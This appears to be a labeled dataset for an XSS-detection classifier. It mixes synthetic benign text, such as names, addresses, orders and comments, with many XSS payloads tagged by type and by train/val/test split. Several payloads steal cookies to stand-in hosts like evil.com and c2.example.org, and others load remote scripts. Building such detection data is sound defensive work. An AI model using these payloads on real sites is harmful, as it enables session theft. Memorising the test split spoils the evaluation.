+Refund of $147.11 processed for order 66113.,0,order,benign,test
+Dr. Zara Mehta,0,name,benign,train
+"Support was excellent, resolved my issue in 17 minutes.",0,feedback,benign,train
+Nice work Liam! The part about photography helped me a lot. This was amazing. Looking forward to more on web security. This was disappointing. Looking forward to more on python.,0,long_paragraph,benign_stress,stress
+"Flat 8A, Hill Crest, Ghaziabad 835575",0,address,benign,train
+Anita Gupta,0,name,benign,val
+"<iframe src=""data:text/html,<b>43326</b>""></iframe>",1,data_uri,data_uri,stress
+<body onstart=prompt(1)>,1,event_common,event_common,test
+"Support was disappointing, resolved my issue in 1 minutes.",0,feedback,benign,train
+Rating 1/5 - useful experience overall.,0,feedback,benign,train
+1;alert(origin),1,js_context,js_context,val
+"Flat 11D, Station Road, Berlin 468292",0,address,benign,train
+Emma Patel,0,name,benign,train
+"<script >alert(String.fromCharCode(88,83,83))</script >",1,script_tag,script_tag,train
+"347 Lake View, Austin",0,address,benign,train
+"<noscript><p title=""</noscript><img src=x onerror=prompt(1)>"">",1,mutation_xss,mutation_xss,stress
+Nice work Liam! The part about databases helped me a lot.,0,comment,benign,train
+"<details open onfocus=""alert(origin)"">",1,event_common,event_common,train
+"x=document.cookie;alert(String.fromCharCode(88,83,83));//18957",1,js_context_long,js_context_long,stress
+<body onload=alert('XSS')><!-- 72892 -->,1,mixed_obfuscated,mixed_obfuscated,train
+"<svg/onerror=alert(String.fromCharCode(88,83,83))>",1,event_common,event_common,train
+C:\Users\Maria\Documents\keyboard.txt,0,url_path,benign_stress,stress
+"<svg onmouseover=""console.log(1)"">",1,event_common,event_common,train
+Meeting at 8pm on 14 Oct,0,price_date,benign,val
+1 < 16 && 30 > 1,0,math,benign_stress,stress
+<script>alert(origin)</script>,1,script_tag,script_tag,train
+`${alert(document.cookie)}`,1,js_context,js_context,val
+Meeting at 9pm on 8 Jun,0,price_date,benign,train
+"<body onload=alert(String.fromCharCode(88,83,83))><!-- 84976 -->",1,mixed_obfuscated,mixed_obfuscated,test
+Price range: $97 - $523,0,price_date,benign,test
+"""Kabir said: 'it's decent!'""",0,structured,benign_stress,stress
+Neha Garcia-Clark,0,name,benign,train
+"""Emma said: 'it's average!'""",0,structured,benign_stress,stress
+"703 Hill Crest, Mumbai",0,address,benign,train
+<body onload=alert(document.domain)><!-- 96565 -->,1,mixed_obfuscated,mixed_obfuscated,train
+1;confirm(1),1,js_context,js_context,train
+"<svg onmouseover=""alert(document.cookie)"">",1,event_common,event_common,val
+Order #97340 confirmed.,0,order,benign,test
+backpack deals,0,search,benign,val
+%3Cscript%3Eprompt(1)%3C/script%3E,1,encoded,encoded,val
+Refund of $125.66 processed for order 87687.,0,order,benign,test
+<script src=http://evil.com/x.js></script>,1,script_tag,script_tag,train
+</script><svg/onload=alert(document.domain)>,1,js_context_long,js_context_long,stress
+"Office Chair - excellent quality, ships in 3 days",0,product,benign,train
+';console.log(1)//,1,js_context,js_context,train
+Your order of 4 x headphones was shipped on 19/9/2026.,0,order,benign,train
+1;alert(document.cookie),1,js_context,js_context,train
+"<body onload=""fetch('http://attacker.net/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,val
+Rating 5/5 - excellent experience overall.,0,feedback,benign,val
+"""Maria said: 'it's amazing!'""",0,structured,benign_stress,stress
+<svg	onload	=	alert('XSS')>,1,case_whitespace,case_whitespace,stress
+"Support was reliable, resolved my issue in 17 minutes.",0,feedback,benign,train
+<svg/onfocus=alert(document.domain)>,1,event_common,event_common,val
+"<body onload=""fetch('http://c2.example.org/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,val
+https://www.example.com/web-security?page=4&sort=asc,0,url_path,benign_stress,stress
+omar.joshi11@outlook.com,0,email,benign,test
+Order #17669 confirmed.,0,order,benign,train
+"935 Lake View, Sydney",0,address,benign,train
+<iframe src=http://h4ck.me/p.html></iframe>,1,frame_object,frame_object,train
+My function onLoad handler is slow when loading 829 rows.,0,code_talk,benign_stress,stress
+`${prompt(1)}`,1,js_context,js_context,train
+Order #32114 confirmed.,0,order,benign,train
+"<audio src=x onfocus=""alert('XSS')"">",1,event_common,event_common,train
+f(x) = x^2 + 9x - 3; f(5) = ?,0,math,benign_stress,stress
+/var/www/photography/index.html,0,url_path,benign_stress,stress
+"Backpack - excellent quality, ships in 2 days",0,product,benign,train
+<script >alert(1)</script >,1,script_tag,script_tag,train
+"211 Lake View, Noida",0,address,benign,test
+<p onfocusin=alert(1)>hover,1,rare_handler,rare_handler,stress
+monitor price,0,search,benign,train
+"<b>Reliable</b> post, thanks Arjun!",0,html_formatting,benign_stress,stress
+"House no. 197, Sector 36, Sydney",0,address,benign,val
+JaVaScRiPt:alert(document.domain),1,case_whitespace,case_whitespace,stress
+Rahul Rao-Smith,0,name,benign,train
+<audio src=x onerror=confirm(1)>,1,event_common,event_common,test
+&#60;script&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;,1,encoded,encoded,train
+This was great. Looking forward to more on python.,0,comment,benign,test
+"""-alert('XSS')-""",1,js_context,js_context,test
+`${alert('XSS')}`,1,js_context,js_context,val
+laptop review,0,search,benign,val
+"Age: 42, Location: Austin",0,price_date,benign,train
+Order #62509 confirmed.,0,order,benign,test
+"<a href=""https://example.com/gardening"">read more</a>",0,html_formatting,benign_stress,stress
+"\';alert(String.fromCharCode(88,83,83))//",1,js_context,js_context,train
+C:\Users\Sneha\Documents\backpack.txt,0,url_path,benign_stress,stress
+Reply to liam.singh11@mail.example by Friday.,0,email,benign,test
+Reply to arjun.taylor23@mail.example by Friday.,0,email,benign,test
+Feedback: Great service and quick delivery.,0,feedback,benign,test
+Dr. Amit Verma,0,name,benign,train
+"<a href=""javascript:console.log(1)"">click</a>",1,js_uri,js_uri,train
+Refund of $13.43 processed for order 31344.,0,order,benign,val
+SKU-5641-EX,0,product,benign,train
+SKU-6169-EZ,0,product,benign,train
+Nice work Maria! The part about python helped me a lot.,0,comment,benign,train
+Your order of 5 x notebook was shipped on 14/5/2026.,0,order,benign,train
+best phone case 2024,0,search,benign,test
+"<img src=x onerror=""new Image().src='http://x.example/?c='+document.cookie"">",1,exfil_dom,exfil_dom,val
+Nice work Emma! The part about python helped me a lot.,0,comment,benign,test
+<span ondblclick=prompt(1)>click,1,rare_handler,rare_handler,stress
+"<a href=""javascript:eval(atob('YWxlcnQoMSk='))"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+<script>confirm(1)</script>,1,script_tag,script_tag,train
+&#x3C;img src=x onerror=alert(origin)&#x3E;,1,encoded,encoded,val
+<svg><animate onbegin=confirm(1) attributeName=x dur=1s>,1,mutation_xss,mutation_xss,stress
+<script>new Image().src='http://c2.example.org/?c='+document.cookie</script>,1,script_tag,script_tag,train
+C:\Users\Rahul\Documents\backpack.txt,0,url_path,benign_stress,stress
+"Desk Lamp - excellent quality, ships in 4 days",0,product,benign,val
+"Notebook - decent quality, ships in 5 days",0,product,benign,train
+"<iframe src=""javascript:console.log(1)""></iframe>",1,js_uri,js_uri,train
+"House no. 474, Sector 37, Berlin",0,address,benign,train
+Price range: $101 - $539,0,price_date,benign,train
+x=document.cookie;alert(document.domain);//71494,1,js_context_long,js_context_long,stress
+<script >console.log(1)</script >,1,script_tag,script_tag,val
+\';alert(document.cookie)//,1,js_context,js_context,val
+Please contact noah.rao66@company.com for help.,0,email,benign,val
+"""onmouseover=""alert(document.domain)"" x=""",1,js_context_long,js_context_long,stress
+"Support was great, resolved my issue in 11 minutes.",0,feedback,benign,val
+"""onmouseover=""alert(document.cookie)"" x=""",1,js_context_long,js_context_long,stress
+"""-prompt(1)-""",1,js_context,js_context,train
+"Flat 32C, Mall Road, Delhi 640299",0,address,benign,test
+Reply to priya.taylor4@mail.example by Friday.,0,email,benign,train
+javascript:alert(document.cookie),1,js_uri,js_uri,train
+"'-alert(String.fromCharCode(88,83,83))-'",1,js_context,js_context,val
+"<a href=""javascript:document.location='http://bad.site/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,val
+Rating 1/5 - solid experience overall.,0,feedback,benign,train
+Anita Sharma,0,name,benign,train
+david.rao51@outlook.com,0,email,benign,train
+Meeting at 5pm on 19 Oct,0,price_date,benign,train
+I quite liked this post on web security.,0,comment,benign,test
+<body onload=alert(document.domain)><!-- 23803 -->,1,mixed_obfuscated,mixed_obfuscated,train
+<IMG SRC=x ONERROR=ALERT(1)>,1,case_whitespace,case_whitespace,stress
+SKU-2128-EX,0,product,benign,train
+Nice work Meera! The part about gardening helped me a lot.,0,comment,benign,test
+"<embed src=""http://bad.site/x.svg"">",1,frame_object,frame_object,test
+"House no. 206, Sector 35, Sydney",0,address,benign,val
+Dr. Amit Reddy,0,name,benign,test
+<img src=x ontoggle=prompt(1)>,1,event_common,event_common,train
+key=value; theme=dark; lang=en-IN,0,structured,benign_stress,stress
+Please contact fatima.patel16@company.com for help.,0,email,benign,train
+Meera Ali-Joshi,0,name,benign,train
+fatima.taylor80@outlook.com,0,email,benign,test
+&#60;script&#62;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;,1,encoded,encoded,test
+Nice work Meera! The part about cooking helped me a lot.,0,comment,benign,train
+best keyboard 2026,0,search,benign,test
+<script >confirm(1)</script >,1,script_tag,script_tag,test
+"Flat 8A, Main Street, Noida 237064",0,address,benign,val
+1;console.log(1),1,js_context,js_context,train
+best coffee maker 2024,0,search,benign,val
+"<embed src=""http://h4ck.me/x.svg"">",1,frame_object,frame_object,val
+"<script type=""text/javascript"">prompt(1)</script>",1,script_tag,script_tag,train
+I quite liked this post on machine learning.,0,comment,benign,train
+Solve: 3x + 14 = 63,0,math,benign_stress,stress
+Price range: $47 - $432,0,price_date,benign,train
+Amit Ali-Joshi,0,name,benign,val
+Rating 2/5 - reliable experience overall.,0,feedback,benign,val
+"Flat 21C, Hill Crest, Berlin 734366",0,address,benign,train
+Your order of 2 x laptop was shipped on 6/11/2026.,0,order,benign,train
+Meeting at 1am on 22 Jun,0,price_date,benign,train
+Refund of $172.17 processed for order 89711.,0,order,benign,test
+2 < 10 && 35 > 1,0,math,benign_stress,stress
+coffee maker comparison,0,search,benign,train
+Rahul Wilson,0,name,benign,val
+water bottle review,0,search,benign,test
+Nice work Kabir! The part about cricket helped me a lot.,0,comment,benign,train
+This was average. Looking forward to more on databases.,0,comment,benign,train
+SKU-7090-DZ,0,product,benign,val
+Dr. David Wilson,0,name,benign,test
+C:\Users\David\Documents\office_chair.txt,0,url_path,benign_stress,stress
+<svg/ontoggle=prompt(1)>,1,event_common,event_common,val
+page=4&sort=desc&q=phone+case,0,url_path,benign_stress,stress
+""";alert(1)//",1,js_context,js_context,train
+Product ID: 439173,0,product,benign,train
+Anita Taylor,0,name,benign,train
+Price range: $76 - $619,0,price_date,benign,train
+anita.taylor67@company.in,0,email,benign,val
+Rating 5/5 - useful experience overall.,0,feedback,benign,val
+Product ID: 520286,0,product,benign,test
+reliable headphones under 290 dollars,0,search,benign,test
+&#x3C;img src=x onerror=alert(1)&#x3E;,1,encoded,encoded,val
+"<noscript><p title=""</noscript><img src=x onerror=alert(origin)>"">",1,mutation_xss,mutation_xss,stress
+Meeting at 3am on 8 Jun,0,price_date,benign,train
+"Tip: avoid eval in your code, use JSON.parse for machine learning data.",0,code_talk,benign_stress,stress
+liam.brown11@company.in,0,email,benign,train
+Order #64596 confirmed.,0,order,benign,train
+Price range: $28 - $542,0,price_date,benign,train
+"House no. 294, Sector 18, Sydney",0,address,benign,train
+"<body onload=""new Image().src='http://evil.com/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+<script>document.write('<img src=http://steal.io/?c='+document.cookie+'>')</script>,1,exfil_dom,exfil_dom,train
+"56 Park Avenue, Delhi",0,address,benign,train
+best desk lamp 2023,0,search,benign,train
+<svg	onload	=	confirm(1)>,1,case_whitespace,case_whitespace,stress
+"Support was amazing, resolved my issue in 26 minutes.",0,feedback,benign,test
+"327 Park Avenue, Mumbai",0,address,benign,test
+useful coffee maker under 284 dollars,0,search,benign,train
+best phone case 2022,0,search,benign,train
+Order #59300 confirmed.,0,order,benign,train
+david.khan7@company.in,0,email,benign,train
+Neha Mehta-Brown,0,name,benign,test
+"Support was excellent, resolved my issue in 1 minutes.",0,feedback,benign,train
+Refund of $50.10 processed for order 63668.,0,order,benign,val
+if x < 1 and y > 4 then z = x + y,0,math,benign_stress,stress
+Meeting at 6am on 17 Jun,0,price_date,benign,train
+Reply to liam.reddy89@mail.example by Friday.,0,email,benign,test
+<p onmouseenter=alert(document.domain)>click,1,rare_handler,rare_handler,stress
+"House no. 415, Sector 57, Toronto",0,address,benign,test
+<body onload=alert(document.cookie)><!-- 80649 -->,1,mixed_obfuscated,mixed_obfuscated,val
+Category: Home & Hardware,0,product,benign,train
+"<script type=""text/javascript"">alert(document.domain)</script>",1,script_tag,script_tag,train
+Price range: $121 - $206,0,price_date,benign,train
+best running shoes 2026,0,search,benign,train
+"Age: 18, Location: London",0,price_date,benign,train
+"Tip: avoid eval in your code, use JSON.parse for python data.",0,code_talk,benign_stress,stress
+Arjun_Wilson31,0,name,benign,test
+"x=document.cookie;alert(String.fromCharCode(88,83,83));//79813",1,js_context_long,js_context_long,stress
+"<math><mtext><table><mglyph><style><!--</style><img title=""--&gt;&lt;img src=1 onerror=prompt(1)&gt;"">",1,mutation_xss,mutation_xss,stress
+best phone case 2023,0,search,benign,train
+""";alert(String.fromCharCode(88,83,83))//",1,js_context,js_context,test
+SELECT name FROM users WHERE id = 802;,0,structured,benign_stress,stress
+f(x) = x^2 + 9x - 2; f(5) = ?,0,math,benign_stress,stress
+Arjun Taylor,0,name,benign,train
+"<img src=x onerror=""new Image().src='http://h4ck.me/?c='+document.cookie"">",1,exfil_dom,exfil_dom,test
+Zara Rao-Ali,0,name,benign,train
+"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",1,mixed_obfuscated,mixed_obfuscated,train
+<SCRIPT>confirm(1)</SCRIPT>,1,script_tag,script_tag,train
+"Age: 41, Location: Toronto",0,price_date,benign,train
+');console.log(1)</script>,1,js_context,js_context,train
+<svg/onerror=alert(1)>,1,event_common,event_common,train
+"<a href=""javascript:confirm(1)"">click</a>",1,js_uri,js_uri,test
+"<a href=""javascript:alert(origin)"">click</a>",1,js_uri,js_uri,test
+zara.garcia54@outlook.com,0,email,benign,test
+Rating 5/5 - amazing experience overall.,0,feedback,benign,train
+Can you write a follow-up on football? Thanks.,0,comment,benign,test
+"<svg><animate onbegin=alert(String.fromCharCode(88,83,83)) attributeName=x dur=1s>",1,mutation_xss,mutation_xss,stress
+<ul><li>monitor</li><li>headphones</li></ul>,0,html_formatting,benign_stress,stress
+"463 Park Avenue, Toronto",0,address,benign,test
+"Flat 2D, Mall Road, London 602985",0,address,benign,train
+Refund of $257.18 processed for order 88497.,0,order,benign,train
+Please contact noah.joshi19@company.com for help.,0,email,benign,val
+"Support was average, resolved my issue in 25 minutes.",0,feedback,benign,train
+Sneha Verma,0,name,benign,train
+JaVaScRiPt:confirm(1),1,case_whitespace,case_whitespace,stress
+"House no. 207, Sector 10, Austin",0,address,benign,val
+%3Cscript%3Ealert('XSS')%3C/script%3E,1,encoded,encoded,train
+"Support was average, resolved my issue in 9 minutes.",0,feedback,benign,train
+rahul.wang26@company.in,0,email,benign,val
+<select onfocusin=prompt(1)>hover,1,rare_handler,rare_handler,stress
+Rating 1/5 - excellent experience overall.,0,feedback,benign,test
+"<script type=""text/javascript"">console.log(1)</script>",1,script_tag,script_tag,val
+<script>document.location='http://attacker.net/?c='+document.cookie</script>,1,script_tag,script_tag,train
+Please contact neha.mehta14@company.com for help.,0,email,benign,train
+Noah Brown,0,name,benign,val
+Please contact liam.khan51@company.com for help.,0,email,benign,train
+Order #46885 confirmed.,0,order,benign,test
+SKU-4893-CY,0,product,benign,val
+"<audio src=x onmouseover=""alert('XSS')"">",1,event_common,event_common,test
+Refund of $245.78 processed for order 98907.,0,order,benign,train
+Liam Reddy-Sharma,0,name,benign,train
+\';console.log(1)//,1,js_context,js_context,train
+`${console.log(1)}`,1,js_context,js_context,test
+disappointing monitor under 316 dollars,0,search,benign,train
+Nice work Maria! The part about web security helped me a lot.,0,comment,benign,train
+priya.joshi26@company.in,0,email,benign,test
+anita.taylor7@gmail.com,0,email,benign,train
+Dr. Sneha Ali,0,name,benign,test
+reliable notebook under 115 dollars,0,search,benign,test
+<body onload=prompt(1)><!-- 90767 -->,1,mixed_obfuscated,mixed_obfuscated,train
+Product ID: 442707,0,product,benign,train
+<div oncopy=confirm(1)>click,1,rare_handler,rare_handler,stress
+Rating 4/5 - average experience overall.,0,feedback,benign,test
+</script><svg/onload=confirm(1)>,1,js_context_long,js_context_long,stress
+Price range: $38 - $476,0,price_date,benign,train
+<script src=http://steal.io/x.js></script>,1,script_tag,script_tag,test
+Product ID: 968485,0,product,benign,val
+amit.kumar87@company.in,0,email,benign,train
+Rahul_Verma73,0,name,benign,train
+amazing notebook under 464 dollars,0,search,benign,test
+Your order of 5 x running shoes was shipped on 2/7/2026.,0,order,benign,train
+Price range: $146 - $554,0,price_date,benign,train
+"<a href=""javascript:fetch('http://steal.io/?c='+document.cookie)"">Claim Prize</a>",1,exfil_dom,exfil_dom,val
+Meeting at 7am on 17 Mar,0,price_date,benign,train
+x=document.cookie;alert('XSS');//73160,1,js_context_long,js_context_long,stress
+Please contact amit.patel65@company.com for help.,0,email,benign,val
+"<a href=""https://example.com/cooking"">read more</a>",0,html_formatting,benign_stress,stress
+javascript:alert(origin),1,js_uri,js_uri,train
+"{'status': 'success', 'id': 8958}",0,structured,benign_stress,stress
+Feedback: Excellent service and quick delivery.,0,feedback,benign,train
+Zara Smith-Taylor,0,name,benign,train
+"<object data=""http://attacker.net/x.swf""></object>",1,frame_object,frame_object,train
+"<body onstart=""alert(document.cookie)"">",1,event_common,event_common,train
+phone case comparison,0,search,benign,train
+Your order of 4 x running shoes was shipped on 3/2/2026.,0,order,benign,train
+<svg onstart=alert('XSS')>,1,event_common,event_common,train
+"Age: 32, Location: Austin",0,price_date,benign,val
+Refund of $105.12 processed for order 20956.,0,order,benign,train
+"Flat 18A, Mall Road, Noida 703656",0,address,benign,train
+"<svg ontoggle=""alert(document.domain)"">",1,event_common,event_common,val
+<ScRiPt>alert(document.cookie)</sCrIpT>,1,case_whitespace,case_whitespace,stress
+I quite liked this post on cricket.,0,comment,benign,train
+I really liked this post on networking.,0,comment,benign,test
+"<iframe src=""data:text/html,<b>20952</b>""></iframe>",1,data_uri,data_uri,stress
+Neha_Garcia86,0,name,benign,val
+david.ali39@company.in,0,email,benign,val
+Please contact neha.gupta74@company.com for help.,0,email,benign,train
+%3cscript%3eprompt(1)%3c%2fscript%3e,1,encoded,encoded,train
+<div oncopy=alert(origin)>hover,1,rare_handler,rare_handler,stress
+"<form action=""javascript:alert(document.cookie)""><input type=submit>",1,js_uri,js_uri,test
+Priya Sharma-Smith,0,name,benign,train
+"Support was amazing, resolved my issue in 2 minutes.",0,feedback,benign,train
+"63 Main Street, Pune",0,address,benign,test
+<ScRiPt>console.log(1)</sCrIpT>,1,case_whitespace,case_whitespace,stress
+"<math><mtext><table><mglyph><style><!--</style><img title=""--&gt;&lt;img src=1 onerror=console.log(1)&gt;"">",1,mutation_xss,mutation_xss,stress
+headphones review,0,search,benign,train
+Order #57435 confirmed.,0,order,benign,val
+<body onload=alert('XSS')><!-- 25584 -->,1,mixed_obfuscated,mixed_obfuscated,train
+"<img
+src=x
+OnErRoR=confirm(1)>",1,case_whitespace,case_whitespace,stress
+"Age: 63, Location: Berlin",0,price_date,benign,train
+"<iframe src=""data:text/html,<b>21792</b>""></iframe>",1,data_uri,data_uri,stress
+<script>new Image().src='http://evil.com/?c='+document.cookie</script>,1,script_tag,script_tag,train
+Please contact maria.wang9@company.com for help.,0,email,benign,train
+SKU-9289-DZ,0,product,benign,train
+desk lamp review,0,search,benign,val
+amazing phone case under 160 dollars,0,search,benign,test
+8 < 13 && 30 > 4,0,math,benign_stress,stress
+<scr<script>ipt>alert(origin)</scr</script>ipt>,1,mixed_obfuscated,mixed_obfuscated,val
+"<input autofocus onfocus=""alert(document.cookie)"">",1,event_common,event_common,train
+"<object data=""http://steal.io/x.swf""></object>",1,frame_object,frame_object,val
+Please contact anita.verma45@company.com for help.,0,email,benign,train
+<textarea onauxclick=alert(document.cookie)>x,1,rare_handler,rare_handler,stress
+/var/www/cooking/index.html,0,url_path,benign_stress,stress
+"<iframe src=""data:text/html,<b>91140</b>""></iframe>",1,data_uri,data_uri,stress
+"727 Lake View, Berlin",0,address,benign,train
+"<a href=""javascript:fetch('http://h4ck.me/?c='+document.cookie)"">Claim Prize</a>",1,exfil_dom,exfil_dom,val
+"585 Lake View, Austin",0,address,benign,train
+"<embed src=""http://x.example/x.svg"">",1,frame_object,frame_object,train
+<svg/onload=alert(document.cookie)>,1,event_common,event_common,train
+"<img src=x onerror=""document.location='http://c2.example.org/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+Dr. Sofia Garcia,0,name,benign,test
+Nice work John! The part about networking helped me a lot.,0,comment,benign,train
+Omar_Joshi39,0,name,benign,train
+Your order of 4 x keyboard was shipped on 23/5/2026.,0,order,benign,train
+"Flat 32A, Lake View, Delhi 478638",0,address,benign,train
+"<svg	onload	=	alert(String.fromCharCode(88,83,83))>",1,case_whitespace,case_whitespace,stress
+<svg/ontoggle=alert(origin)>,1,event_common,event_common,train
+"Support was excellent, resolved my issue in 21 minutes.",0,feedback,benign,test
+"87 MG Road, Sydney",0,address,benign,train
+/var/www/databases/index.html,0,url_path,benign_stress,stress
+Amit Rao,0,name,benign,train
+"Desk Lamp - amazing quality, ships in 7 days",0,product,benign,train
+kabir.sharma2@company.in,0,email,benign,test
+"<object data=""http://h4ck.me/x.swf""></object>",1,frame_object,frame_object,train
+SELECT name FROM users WHERE id = 600;,0,structured,benign_stress,stress
+"<iframe src=""javascript:prompt(1)""></iframe>",1,js_uri,js_uri,train
+Order #95701 confirmed.,0,order,benign,train
+Dr. Liam Wilson,0,name,benign,train
+"<body onload=""document.location='http://c2.example.org/?c='+document.cookie"">",1,exfil_dom,exfil_dom,val
+Category: Books & Garden,0,product,benign,train
+"House no. 238, Sector 50, Austin",0,address,benign,train
+"Support was great, resolved my issue in 4 minutes.",0,feedback,benign,train
+anita.taylor25@company.in,0,email,benign,train
+');alert(1);//,1,js_context,js_context,val
+best phone case 2021,0,search,benign,val
+"21 Park Avenue, Pune",0,address,benign,train
+&#x3C;img src=x onerror=confirm(1)&#x3E;,1,encoded,encoded,train
+"House no. 492, Sector 5, London",0,address,benign,train
+"{'status': 'success', 'id': 7802}",0,structured,benign_stress,stress
+"<a href=""javascript:alert(String.fromCharCode(88,83,83))"">click</a>",1,js_uri,js_uri,val
+"Age: 35, Location: Mumbai",0,price_date,benign,train
+<textarea onmouseenter=alert(document.cookie)>hover,1,rare_handler,rare_handler,stress
+"Support was useful, resolved my issue in 17 minutes.",0,feedback,benign,test
+Meera Rao-Joshi,0,name,benign,train
+SKU-2297-DZ,0,product,benign,train
+Your order of 1 x notebook was shipped on 12/5/2026.,0,order,benign,train
+"Desk Lamp - amazing quality, ships in 6 days",0,product,benign,train
+Your order of 2 x running shoes was shipped on 12/5/2026.,0,order,benign,test
+Solve: 8x + 1 = 91,0,math,benign_stress,stress
+<body onload=console.log(1)><!-- 75162 -->,1,mixed_obfuscated,mixed_obfuscated,train
+This was useful. Looking forward to more on web security.,0,comment,benign,train
+Why does fetch return a promise? Asking about python code.,0,code_talk,benign_stress,stress
+C:\Users\Anita\Documents\backpack.txt,0,url_path,benign_stress,stress
+"Headphones - useful quality, ships in 6 days",0,product,benign,val
+"House no. 76, Sector 37, Austin",0,address,benign,val
+"Great article about web security, thanks for sharing!",0,comment,benign,val
+"House no. 341, Sector 23, Ghaziabad",0,address,benign,val
+SKU-8122-AY,0,product,benign,train
+"664 Main Street, Ghaziabad",0,address,benign,train
+This was excellent. Looking forward to more on music.,0,comment,benign,test
+SKU-3744-AZ,0,product,benign,test
+"360 Mall Road, Austin",0,address,benign,test
+"<form action=""javascript:console.log(1)""><input type=submit>",1,js_uri,js_uri,test
+Meera Lopez,0,name,benign,train
+"<embed src=""http://steal.io/x.svg"">",1,frame_object,frame_object,train
+<svg><script>alert('XSS')</script></svg>,1,mixed_obfuscated,mixed_obfuscated,train
+'-alert('XSS')-',1,js_context,js_context,val
+liam.ali26@gmail.com,0,email,benign,val
+Reply to kabir.joshi39@mail.example by Friday.,0,email,benign,train
+"Desk Lamp - solid quality, ships in 3 days",0,product,benign,train
+anita.rao91@college.edu,0,email,benign,test
+Price range: $41 - $719,0,price_date,benign,train
+"<svg onerror=""alert(String.fromCharCode(88,83,83))"">",1,event_common,event_common,train
+"""-alert(1)-""",1,js_context,js_context,train
+<body onload=alert(origin)><!-- 59759 -->,1,mixed_obfuscated,mixed_obfuscated,test
+Refund of $180.38 processed for order 48687.,0,order,benign,train
+<svg><script>prompt(1)</script></svg>,1,mixed_obfuscated,mixed_obfuscated,train
+"<math><mtext><table><mglyph><style><!--</style><img title=""--&gt;&lt;img src=1 onerror=alert(String.fromCharCode(88,83,83))&gt;"">",1,mutation_xss,mutation_xss,stress
+"Support was useful, resolved my issue in 6 minutes.",0,feedback,benign,train
+amazing desk lamp under 297 dollars,0,search,benign,val
+<div onwheel=alert(document.cookie)>hover,1,rare_handler,rare_handler,stress
+how to learn cricket fast,0,search,benign,train
+"<iframe src=""javascript:alert(document.cookie)""></iframe>",1,js_uri,js_uri,train
+"917 Hill Crest, Pune",0,address,benign,train
+SKU-8418-CZ,0,product,benign,train
+Why does fetch return a promise? Asking about gardening code.,0,code_talk,benign_stress,stress
+"House no. 305, Sector 17, London",0,address,benign,train
+"112 MG Road, Mumbai",0,address,benign,train
+<textarea onauxclick=alert(document.domain)>click,1,rare_handler,rare_handler,stress
+"javascript:alert(String.fromCharCode(88,83,83))",1,js_uri,js_uri,train
+"<iframe srcdoc=""<script>prompt(1)</script>""></iframe>",1,frame_object,frame_object,test
+reliable notebook under 12 dollars,0,search,benign,val
+Refund of $288.15 processed for order 60353.,0,order,benign,train
+Refund of $75.52 processed for order 41278.,0,order,benign,train
+"<noscript><p title=""</noscript><img src=x onerror=alert('XSS')>"">",1,mutation_xss,mutation_xss,stress
+phone case review,0,search,benign,train
+');alert(origin)</script>,1,js_context,js_context,test
+Meeting at 1pm on 22 Oct,0,price_date,benign,train
+<body onload=alert(1)><!-- 70701 -->,1,mixed_obfuscated,mixed_obfuscated,train
+""";alert('XSS')//",1,js_context,js_context,train
+"Nice work David! The part about photography helped me a lot. This was great. Looking forward to more on travel. Can you write a follow-up on cooking? Thanks. Great article about football, thanks for sharing!",0,long_paragraph,benign_stress,stress
+"Flat 21A, Park Avenue, Delhi 949541",0,address,benign,train
+"<a href=""https://example.com/python"">read more</a>",0,html_formatting,benign_stress,stress
+C:\Users\Amit\Documents\keyboard.txt,0,url_path,benign_stress,stress
+<script>alert(document.cookie)</script>,1,script_tag,script_tag,val
+"<body onload=alert(String.fromCharCode(88,83,83))><!-- 96921 -->",1,mixed_obfuscated,mixed_obfuscated,train
+This was disappointing. Looking forward to more on photography.,0,comment,benign,train
+useful keyboard under 75 dollars,0,search,benign,train
+Your order of 4 x keyboard was shipped on 5/8/2026.,0,order,benign,train
+Nice work Chen! The part about web security helped me a lot.,0,comment,benign,train
+Fatima_Wang80,0,name,benign,test
+&#60;script&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;,1,encoded,encoded,train
+Meera Patel,0,name,benign,test
+Product ID: 984293,0,product,benign,train
+Please contact liam.taylor56@company.com for help.,0,email,benign,test
+"<img src=x onerror=""fetch('http://h4ck.me/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,train
+"<body onload=""document.location='http://steal.io/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+Nice work Anita! The part about gardening helped me a lot.,0,comment,benign,train
+<body onload=console.log(1)><!-- 95355 -->,1,mixed_obfuscated,mixed_obfuscated,val
+"846 Main Street, Austin",0,address,benign,val
+"Great article about travel, thanks for sharing! Can you write a follow-up on music? Thanks. Can you write a follow-up on music? Thanks.",0,long_paragraph,benign_stress,stress
+"<body onload=""new Image().src='http://c2.example.org/?c='+document.cookie"">",1,exfil_dom,exfil_dom,val
+Meeting at 5am on 16 Oct,0,price_date,benign,train
+<body onload=confirm(1)><!-- 35729 -->,1,mixed_obfuscated,mixed_obfuscated,train
+Refund of $29.47 processed for order 48228.,0,order,benign,train
+<script>document.location='http://bad.site/?c='+document.cookie</script>,1,script_tag,script_tag,test
+<IMG SRC=x ONERROR=ALERT(DOCUMENT.COOKIE)>,1,case_whitespace,case_whitespace,stress
+<script>console.log(1)</script>,1,script_tag,script_tag,train
+<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,script_tag,script_tag,test
+&#x3C;img src=x onerror=alert(document.domain)&#x3E;,1,encoded,encoded,train
+SKU-4401-AX,0,product,benign,train
+"977 Station Road, Mumbai",0,address,benign,train
+"<a href=""javascript:alert(document.domain)"">click</a>",1,js_uri,js_uri,train
+"<body onload=""fetch('http://x.example/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,train
+running shoes review,0,search,benign,test
+'-alert(1)-',1,js_context,js_context,train
+Order #45825 confirmed.,0,order,benign,train
+This was amazing. Looking forward to more on machine learning.,0,comment,benign,train
+Nice work Sneha! The part about photography helped me a lot.,0,comment,benign,test
+<i>Noah</i> said the running shoes is decent.,0,html_formatting,benign_stress,stress
+"677 Park Avenue, Pune",0,address,benign,train
+<script>fetch('http://bad.site/?c='+document.cookie)</script>,1,script_tag,script_tag,train
+"Age: 49, Location: Pune",0,price_date,benign,test
